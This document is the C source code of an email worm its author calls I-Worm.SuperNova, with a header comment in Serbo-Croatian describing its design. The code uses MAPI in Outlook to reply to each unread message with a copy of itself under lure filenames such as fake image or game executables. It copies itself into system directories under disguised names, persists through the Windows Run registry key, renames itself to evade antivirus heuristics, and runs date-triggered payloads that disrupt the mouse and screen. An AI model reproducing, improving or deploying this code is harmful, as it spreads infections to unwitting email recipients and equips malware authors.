/*        PROJEKAT SINTESYS			
            ---------------------

I-Worm.SuperNova by Specie (I generacija)
Kompajlirano pod VC++ 6.0 

INFO:

  SuperNova je moj prvi projekat koji je radjen 
  pod VC-om. Crv je tek u prvoj fazi kodiranja
  tako da ce biti nadogradjivan i popravljan 
  dosta dugo vremena, a razlog tome jeste sto
  zelim da ovo bude nesto zaista "ozbiljnije"
  od radova do sada. 

  Kad se pokrene, crv ceka u memoriji da se pokrene
  Outlook i da User klikne na Inbox tab. Kada se to 
  desi crv "odspava" 30 sekundi zbog toga sto zeli da 
  saceka kako bi Outlook mogao da izvrsi download poruka
  u Inbox. Onda pronadje neprocitane poruke i onda 
  formira poruku tako sto je subject i ime attachmenta 
  formirano slucajnim odabirom, a adresu "vadi" iz te 
  neprocitane poruke. Posle toga se kopira u Win i Sys dir, 
  ali pri tome pazeci da kad se kopira u Sys dir koristi ime 
  formirano slucajnim odabirom. Nakon toga ide payload 
  koji zavisi od sistemskog vremena...te nakraju se upise u 
  Registry pod imenom Explorer32 i to u "run" kljuc.
  Ono sto je zanimljivo jeste da crv posle svakog startanja 
  mijenja ime datoteke koju upisuje pod "run" kljucem kako bi
  na taj nacin pokusao zaobici neke heuristike AV alata... ;)
  
  Crv je tezak nekih 156 KB, ali ce biti kompresovan sa UPX-om
  i tezi ce nekih 27 KB.

  Ovo je znaci I generacija, te ce ovaj crv u buducnosti imati 
  jos neka nadogradjivanja...

  Specie

  "Kad sve izgleda da umire, 
   ono se ustvari radja"

*/


  
#include <windows.h>
#include <mapi.h>
#include <wingdi.h>
#include <winuser.h>


int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int);



//------------------------------------------------------------------

HINSTANCE	  	 hMapi;						
LHANDLE			 sesija;
HDC			 dc;
MSG			 mesg;
RECT			 tacka;
HKEY			 kljuc;


SYSTEMTIME		 vrijeme;

LPMAPILOGON	  	 MailLogiranje = NULL;
LPMAPILOGOFF		 MailLogoff = NULL;
LPMAPISENDMAIL  		 MailPosalji = NULL;
LPMAPIFINDNEXT  		 MailNadji = NULL;
LPMAPIREADMAIL  		 MailCitaj = NULL;
LPMAPIFREEBUFFER		 MailFreeBuffer = NULL;


char			 lpszMessageID[513];
char			 vIme[256],
			 ime[50],
			 adresa[50],
			 windir[256],
			 sysDir[256],
			 pr[100];
			

//------------------------------------------------------------------

char			 *fajl[]=
{
				 "Proba.exe",
				 "Msscrt.exe",
				 "Setup32.exe",
				 "IExplorer.exe",
				 "Bihnet.exe",
				 "Bihnet32.exe",
				 "Slike_s_mora.exe",
				 "3DIgrica.exe",
				 "Osama_Bin_Laden.exe",
				 "Clinton_vs_Osama.exe",
				 "Alija_Izetbegovic.exe",
				 "Mirc32.exe",
				 "Info#32.exe",
				 "Osama_i_Bush.gif.exe"
};

char			 *poruke[]=
{
				 "Dokument je preuzet od strane ilegalne firme"
				 "koja je radila na prostoru BiH...sdfser",
				 "Pozdrav!",
				 "Spisak ilegalnih radova...fajl koristi skriveno ime"
				 "zbog moguceg provaljivanja u zasticene informacije",
				 "Postoji samo jedan nacin da saznamo ....",
				 "Recept za psoriazu i bolove u kicmi...",
				 "Nesto zaista zanimljivo kad je u pitanju Osama, heh",
				 "Reklamna kampanja!"
};

char			 *tsrFajl[]=
{
				 "\\temp32.exe",
				 "\\MsCrt32.exe",
				 "\\Win32Dll.exe",
				 "\\SysRtw32.exe",
				 "\\BihUpdate.exe",
				 "\\UserGDL.exe",
				 "\\User32Rem.exe"
};



//------------------------------------------------------------------

MapiMessage		 *msg;

//------------------------------------------------------------------

int WINAPI WinMain(HINSTANCE h,
				   HINSTANCE hp,
				   LPSTR lpCmd,
				   int cmdShow)

{

do {

	while(PeekMessage(&mesg,NULL,0,0,PM_REMOVE))
	DispatchMessage(&mesg);

		if(!FindWindow(0,"Inbox - Microsoft Outlook"))
			{
			WinMain;
			}
		
		if(FindWindow(0,"Inbox - Microsoft Outlook"))
			{
			
			GetModuleFileName(h,vIme,sizeof(vIme));
			hMapi = LoadLibrary("MAPI32.DLL");

			if (hMapi) {


			if (!(MailLogiranje = (LPMAPILOGON) GetProcAddress (hMapi, "MAPILogon")))
			return (FALSE);
			if (!(MailLogoff = (LPMAPILOGOFF) GetProcAddress (hMapi, "MAPILogoff")))
			return (FALSE);
			if (!(MailPosalji = (LPMAPISENDMAIL) GetProcAddress (hMapi, "MAPISendMail")))
			return (FALSE);
			if (!(MailNadji = (LPMAPIFINDNEXT) GetProcAddress (hMapi, "MAPIFindNext")))
			return (FALSE);
			if (!(MailCitaj = (LPMAPIREADMAIL) GetProcAddress (hMapi, "MAPIReadMail")))
			return (FALSE);
			if (!(MailFreeBuffer = (LPMAPIFREEBUFFER) GetProcAddress (hMapi, "MAPIFreeBuffer")))
			return (FALSE);
			
			MailLogiranje(0,NULL,NULL,MAPI_NEW_SESSION,NULL,&sesija);

			Sleep(30000);

			if (MailNadji(sesija,0,NULL,NULL,MAPI_LONG_MSGID|MAPI_UNREAD_ONLY,NULL,lpszMessageID)==SUCCESS_SUCCESS)	

			{


			do 
			{


				if (MailCitaj(sesija,NULL,lpszMessageID,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&msg)==SUCCESS_SUCCESS)

				{
					strcpy(adresa,msg->lpOriginator->lpszAddress);
					strcpy(ime,msg->lpOriginator->lpszName);
   					msg->ulReserved = 0;
					msg->lpszSubject = "[Bez Naslova]";
					msg->lpszNoteText = poruke[GetTickCount()&6];
					msg->lpszMessageType = NULL;
					msg->lpszDateReceived = NULL;
					msg->lpszConversationID = NULL;
					msg->flFlags = MAPI_SENT;
					msg->lpOriginator->ulReserved = 0;
					msg->lpOriginator->ulRecipClass=MAPI_ORIG;
					msg->lpOriginator->lpszName=msg->lpRecips->lpszName;  
					msg->lpOriginator->lpszAddress=msg->lpRecips->lpszAddress;  
					msg->nRecipCount = 1;
					msg->lpRecips->ulReserved = 0;
					msg->lpRecips->ulRecipClass = MAPI_TO;
					msg->nFileCount = 1;
					msg->lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
					memset(msg->lpFiles,0,sizeof(MapiFileDesc));
					msg->lpFiles->ulReserved = 0;
					msg->lpFiles->flFlags = NULL;
					msg->lpFiles->nPosition = -1;
					msg->lpFiles->lpszPathName = vIme;
					msg->lpFiles->lpszFileName = fajl[GetTickCount()&14];
					msg->lpFiles->lpFileType = NULL;
	
	
					MailPosalji(sesija,NULL,msg,NULL,NULL);
	
				}

			} while(MailNadji(sesija,
							  0,
							  NULL,
							  lpszMessageID,
				              MAPI_LONG_MSGID|MAPI_UNREAD_ONLY,
							  NULL,
							  lpszMessageID)==SUCCESS_SUCCESS);

}

	free(msg->lpFiles);
	MailFreeBuffer(msg);
	MailLogoff(sesija,0,0,0);
	FreeLibrary(hMapi);
}

//------------------------------------------------------------------

	
	GetWindowsDirectory(windir,sizeof(windir));
	GetSystemDirectory(sysDir,sizeof(sysDir));

	strcat(windir,"\\Krn32Dll.exe");
	strcat(sysDir,tsrFajl[GetTickCount()&5]);

	CopyFile(vIme,sysDir,false);
	CopyFile(vIme,windir,false);


//------------------------------------------------------------------


	GetSystemTime(&vrijeme);

	if (vrijeme.wDayOfWeek==0) 
	{
		MessageBox(NULL,"Am I Error Of People's Mistake Or What??",
						"I-Worm.SuperNova by Species Labs [c] 01-02"
						"",MB_OK);
	}

	if (vrijeme.wMonth == 7)
	{
		dc = GetDC(NULL);
		TextOut(dc,200,200,"Covjek je gospodar svoje rijeci"
			               " ...ali kad ta rijec izadje iz njega"
						   " on postaje njen Rob!",88);
		ReleaseDC(NULL,dc);
	}

	if (vrijeme.wMonth == 11)
	{
		SwapMouseButton(true);
	}

	if (vrijeme.wMonth == 7 && vrijeme.wDay == 7)
	{
		for(int i=0;i<800;i++){
			for(int l=0;l<600;l++){
				SetCursorPos(i,l);
			}
		}
	}
	
	if (vrijeme.wMonth == 1 && vrijeme.wDay == 1)
	{
		tacka.bottom = 70;
		tacka.left = 70;
		tacka.right = 70;
		tacka.top = 70;
		ClipCursor(&tacka);
	}

	if (vrijeme.wMonth == 4)
	{
		TileWindows(NULL,MDITILE_HORIZONTAL,NULL,0,NULL);
	}
	
	break;
	
	}

}while(!FindWindow(0,"Inbox - Microsoft Outlook"));


//------------------------------------------------------------------


	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
				 0,
				 KEY_WRITE,
				 &kljuc);

	GetSystemDirectory(pr,sizeof(pr));
	strcat(pr,tsrFajl[GetTickCount()&7]);
	CopyFile(vIme,pr,0);

	RegSetValueEx(kljuc,"Explorer32",0,REG_SZ,(BYTE *)pr,sizeof(pr));
	RegCloseKey(kljuc);


//------------------------------------------------------------------
	
	return mesg.wParam;
 
}




